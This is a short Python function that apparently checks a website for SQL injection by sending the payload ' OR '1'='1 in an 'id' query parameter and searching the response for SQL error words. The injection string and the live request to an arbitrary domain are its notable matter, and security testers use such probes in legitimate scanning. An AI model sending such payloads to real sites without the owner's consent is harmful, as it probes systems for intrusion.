import requests

def test_sqli(domain):
    payload = "' OR '1'='1"

    try:
        r = requests.get(f"http://{domain}/?id={payload}", timeout=5)

        errors = ["sql", "syntax", "mysql", "query"]

        for e in errors:
            if e in r.text.lower():
                return "Possible SQL injection vulnerability"

        return "No obvious SQL injection error"
    except:
        return "SQLi test failed"
